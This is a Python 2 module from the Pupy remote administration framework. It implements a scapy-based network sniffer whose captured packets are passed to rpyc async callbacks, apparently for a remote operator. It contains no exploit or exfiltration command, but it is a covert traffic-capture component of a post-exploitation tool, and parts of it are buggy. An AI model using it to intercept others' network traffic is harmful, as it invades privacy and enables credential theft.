# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import sys
import traceback

from scapy.all import (
    conf, ETH_P_ALL, six, WINDOWS, errno
)

try:
    from scapy.all import POWERSHELL_PROCESS  # Import fails on Linux
except ImportError:
    pass

from select import select, error as select_error
from threading import Thread, Event
from rpyc import async
from psutil import net_if_addrs
from time import time

def isniff(count=0, prn=None, lfilter=None,
          L2socket=None, timeout=None, completion=None,
          iface=None, *arg, **karg):

    c = 0
    sniff_sockets = {}  # socket: label dict

    if not sniff_sockets or iface is not None:
        if L2socket is None:
            L2socket = conf.L2listen
        if isinstance(iface, list):
            sniff_sockets.update(
                (L2socket(type=ETH_P_ALL, iface=ifname, *arg, **karg), ifname)
                for ifname in iface
            )
        elif isinstance(iface, dict):
            sniff_sockets.update(
                (L2socket(type=ETH_P_ALL, iface=ifname, *arg, **karg), iflabel)
                for ifname, iflabel in six.iteritems(iface)
            )
        else:
            sniff_sockets[L2socket(type=ETH_P_ALL, iface=iface,
                                   *arg, **karg)] = iface

    if timeout is not None:
        stoptime = time() + timeout

    remain = None
    read_allowed_exceptions = ()

    if conf.use_bpf:
        from scapy.arch.bpf.supersocket import bpf_select

        def _select(sockets):
            return bpf_select(sockets, remain)

    elif WINDOWS:
        from scapy.arch.pcapdnet import PcapTimeoutElapsed
        read_allowed_exceptions = (PcapTimeoutElapsed,)

        def _select(sockets):
            try:
                return sockets
            except PcapTimeoutElapsed:
                return []
    else:
        def _select(sockets):
            try:
                return select(sockets, [], [], remain or 5)[0]
            except select_error as exc:
                # Catch 'Interrupted system call' errors
                if exc[0] == errno.EINTR:
                    return []
                raise
    try:
        while sniff_sockets:
            if timeout is not None:
                remain = stoptime - time()
                if remain <= 0:
                    break

            if completion is not None:
                if completion.is_set():
                    break

            ins = _select(sniff_sockets)
            for s in ins:
                try:
                    p = s.recv()
                except read_allowed_exceptions:
                    continue
                if p is None:
                    del sniff_sockets[s]
                    break
                if lfilter and not lfilter(p):
                    continue
                p.sniffed_on = sniff_sockets[s]

                c += 1
                if prn:
                    r = prn(p)
                    if r is not None:
                        print(r)

                if 0 < count <= c:
                    sniff_sockets = []
                    break

    except KeyboardInterrupt:
        pass

class StopSniff(Exception):
    pass

class SniffSession(Thread):
    def __init__(self, on_data, on_close, iface=None, bpf=None, timeout=None, count=0):
        super(SniffSession, self).__init__()

        self._on_data = on_data
        self._on_close = on_close

        self.bpf = bpf
        self.timeout = timeout
        self.count = count
        self.iface = None
        self.name = None

        self.completion = Event()

        self._set_iface(iface)

    def _set_iface(self, iface):

        if not type(iface) == unicode:
            iface = iface.decode('utf-8')

        nice_name = iface
        iface = iface.encode(sys.getfilesystemencoding())

        known_ifaces = net_if_addrs()

        if iface not in known_ifaces:
            raise ValueError('Unknown interface {} / known: {}'.format(
                nice_name.encode('utf-8'),
                ', '.join(
                    '"{}"'.format(
                        x.decode(sys.getfilesystemencoding()).encode('utf-8'))
                for x in known_ifaces)))

        if WINDOWS:
            from scapy.arch.windows import IFACES

            mac = None
            for family in known_ifaces[iface]:
                if '-' in family.address:
                    mac = family.address
                    break

            if not mac:
                raise ValueError('Could not find MAC for specified interface')

            for guid, scapy_iface in IFACES.items():
                if scapy_iface.mac.replace('-', ':') == mac.replace('-', ':'):
                    self.iface = scapy_iface
                    break

            if not self.iface:
                raise ValueError('Could not find scapy interface')

        else:
            self.iface = iface

        self.nice_name = nice_name

    def sniff_callback(self, packet):
        if self.completion.is_set():
            raise StopSniff()

        if self._on_data:
            self._on_data(str(packet))

    def run(self):
        self.completion.clear()
        reason = None

        try:
            isniff(
                prn=self.sniff_callback,
                filter=self.bpf,
                count=self.count,
                timeout=self.timeout,
                iface=self.iface,
                completion=self.completion
            )

        except StopSniff:
            reason = 'Interrupted'

        except Exception as e:
            reason = 'Sniff: {}: {}'.format(
                e, traceback.format_exc())

        finally:
            self.completion.set()
            if self._on_close:
                try:
                    self._on_close(reason)
                except:
                    pass

            if WINDOWS:
                try:
                    POWERSHELL_PROCESS.close()
                except:
                    pass


    def stop(self):
        self.completion.set()

    def is_stopped(self, x):
        return self.stopped

def run(on_data, on_close, iface=None, bpf=None, timeout=None, count=0):
    sniffer = SniffSession(
        async(on_data), async(on_close), iface, bpf, timeout, count)

    sniffer.start()

    return sniffer.nice_name, sniffer.stop

if __name__=="__main__":

    def cb(pkt):
        print pkt.summary()

    t = SniffSession(cb, None, iface="eth0")
    t.start()
    t.stop()
